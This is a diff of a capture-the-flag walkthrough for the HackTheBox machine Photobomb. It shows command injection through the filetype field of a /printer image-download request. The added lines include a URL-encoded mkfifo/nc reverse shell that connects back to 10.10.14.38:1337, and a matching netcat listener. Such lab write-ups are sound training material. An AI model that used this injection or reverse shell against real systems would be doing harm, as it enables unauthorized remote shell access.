@@ -84,18 +84,18 @@ dirsearch -u photobomb.htb
 
 #### /printer:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 * We are met with a page that allows you to download images with different file types and dimensions
 * Let's download an image and capture the request in burp
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 Let's see if we can exploit the fields in this request and get some strange behavior.
 
 Attempt LFI vulnerability:
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 * However, we get a response that says invalid photo
 * This makes me know that there are some kind of validation checking techniques in play here
@@ -103,16 +103,17 @@ Attempt LFI vulnerability:
 
 #### Command Injection:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 The semicolon allows us to pass through additional commands. When I was able to check how long it takes for the request to be processed by the server with the sleep command.&#x20;
 
 With semicolon: 3.3 milliseconds
 
-With semicolon and `sleep 5` command (Be sure to URL encode this as seen in the screenshot): 8.4 seconds&#x20;
+<mark style="color:yellow;">With semicolon and</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`sleep 5`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">command (Be sure to URL encode this as seen in the screenshot): 8.4 seconds</mark>&#x20;
 
 * This confirms that we have successful command injection on our target
 * Time for exploitation
+* <mark style="color:yellow;">Through some testing, I was able to conclude that the vulnerable field is the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`filetype`</mark><mark style="color:yellow;">field</mark>
 
 ## Exploitation
 
@@ -120,7 +121,27 @@ With semicolon and `sleep 5` command (Be sure to URL encode this as seen in the 
 
 The injection point is found in <mark style="color:yellow;">http://photobomb.htb/printer</mark> upon downloading an image and adding a semicolon within one of the fields. Immediately after the semicolon, place your URL-Encoded reverse shell here.&#x20;
 
+{% embed url="https://www.revshells.com/" %}
 
+Let's utilize a reverse nc mkfifo reverse shell and make sure that it is URL-Encoded.
+
+Create Reverse Shell:
+
+```
+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.38%201337%20%3E%2Ftmp%2Ff
+```
+
+Establish NC Listener:
+
+```
+nc -lnvp 1337
+```
+
+Append reverse shell to POST request and send to the server:
+
+<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
